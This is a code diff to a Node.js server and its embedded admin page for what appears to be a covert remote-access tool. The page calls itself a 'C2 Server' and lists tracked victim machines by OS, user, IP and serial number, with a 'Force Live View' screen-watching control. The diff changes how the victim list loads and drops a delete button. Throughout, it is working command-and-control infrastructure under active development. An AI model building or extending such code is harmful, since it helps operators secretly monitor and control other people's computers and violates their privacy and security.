@@ -20,16 +20,6 @@ const TURSO_AUTH_TOKEN = RAW_TOKEN
  .replace(/^Bearer\s+/i, '')
  .trim();
 
-if (!TURSO_DB_URL) {
- console.error('[DB] Missing TURSO_DATABASE_URL environment variable.');
-}
-
-if (!TURSO_AUTH_TOKEN) {
- console.error('[DB] Missing TURSO_AUTH_TOKEN environment variable.');
-}
-
-console.log('[DB] Connecting to Turso at ' + TURSO_DB_URL.replace(/\/\/.*@/, '//***@'));
-
 let dbClient;
 let dbReady = false;
 
@@ -42,6 +32,7 @@ try {
  console.error('[DB] Turso client creation failed:', error.message);
 }
 
+// Ensure schema exists and mark ready
 async function ensureSchema() {
  try {
  await dbClient.execute(`
@@ -74,6 +65,9 @@ async function ensureSchema() {
  throw error;
  }
 }
+
+// Call this immediately when the module loads
+ensureSchema().catch(err => console.error('[DB] Initial schema check failed:', err));
 
 function query(sql, params = []) {
  return dbClient.execute(sql, params);
@@ -188,7 +182,21 @@ wss.on('connection', (ws, req) => {
  logDB(`[ADMIN] Connected via port ${req.socket.remotePort}`);
  notifyAdmin(clientId, '🛡️ Admin Session Started');
  sendMessage(ws, { type: 'registered', id: clientId });
- broadcastToAdmins(ws, { type: 'refresh_users' });
+ 
+ // Send all users from DB to the new admin
+ const allUsers = await queryRows('SELECT * FROM users');
+ const usersList = allUsers.map(u => ({
+ id: u.id,
+ os: u.os,
+ arch: u.arch,
+ user: u.user,
+ ip: u.ip,
+ last_seen: u.last_seen,
+ status: u.status,
+ serial_number: u.serial_number
+ }));
+ sendMessage(ws, { type: 'init_users', users: usersList });
+ 
  return;
  }
 
@@ -367,7 +375,7 @@ module.exports = async (req, res) => {
  service: 'screen-connect',
  database: 'disconnected',
  uptime: process.uptime(),
- db_type: 'turso/libsql',
+ db_type: 'libsql',
  error: error.message,
  db_ready: dbReady,
  });
@@ -496,8 +504,6 @@ const adminHTML = `
  console.log("Admin connected to C2");
  ws.send(JSON.stringify({ type: 'register_admin' }));
  addLog("Connected to C2 Server", "blue");
- // Fetch initial user list from DB
- fetchUsersFromDB();
  };
 
  ws.onmessage = (event) => {
@@ -564,6 +570,22 @@ const adminHTML = `
  addLog(\`[SESSION] Active session established with \${data.agentId}\`, 'green');
  }
  }
+ else if (data.type === 'init_users') {
+ // Initialize users from DB on admin connect
+ users = {};
+ data.users.forEach(user => {
+ users[user.id] = {
+ status: user.status === 'Online' ? 'Online' : 'Offline',
+ logs: [],
+ info: { os: user.os, user: user.user },
+ lastSeen: user.last_seen * 1000,
+ sessionActive: false,
+ serialNumber: user.serial_number
+ };
+ });
+ renderUsers();
+ addLog("Loaded users from Database", "blue");
+ }
  else {
  if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'user_update' && data.type !== 'screen_data' && data.type !== 'heartbeat' && data.type !== 'system' && data.type !== 'system_log') {
  addLog(\`[\${data.targetId || data.id}] Received: \${data.type}\`, 'blue');
@@ -580,32 +602,6 @@ const adminHTML = `
  console.error("Error parsing message:", e);
  }
  };
-
- // Fetch users from the DB API endpoint
- async function fetchUsersFromDB() {
- try {
- const response = await fetch('/api/users');
- const dbUsers = await response.json();
-
- // Clear existing users to avoid duplicates
- users = {};
-
- dbUsers.forEach(user => {
- // Convert DB format to UI format
- users[user.id] = {
- status: user.status === 'Online' ? 'Online' : 'Offline',
- logs: [],
- info: { os: user.os, user: user.user },
- lastSeen: user.last_seen * 1000, // Convert to milliseconds
- sessionActive: false,
- serialNumber: user.serial_number
- };
- });
- renderUsers();
- } catch (error) {
- console.error("Failed to fetch users from DB", error);
- }
- }
 
  function getSession(targetId) {
  if (!sessions[targetId]) {
@@ -757,7 +753,6 @@ const adminHTML = `
  Last Seen: \${lastSeen}<br>
  <button class="btn \${btnClass}" onclick="joinUser('\${id}', '\${data.status}')">\${btnText}</button>
  <button class="btn btn-force" onclick="forceLiveView('\${id}')">📺 Force Live View</button>
- <button class="btn btn-danger" onclick="deleteUser('\${id}')">❌ Delete User</button>
  \`;
  grid.appendChild(card);
  }
@@ -809,18 +804,6 @@ const adminHTML = `
  targetId: lastId,
  from: null
  }));
- }
- }
-
- function deleteUser(id) {
- if (confirm(\`Are you sure you want to delete \${id}?\`)) {
- // Remove from local memory
- delete users[id];
- renderUsers();
- addLog(\`[DELETE] User \${id} removed from dashboard\`, 'red');
-
- // Optionally remove from DB here if you have an API endpoint for it
- // fetch(\`/api/users/\${id}\`, { method: 'DELETE' });
  }
  }
 
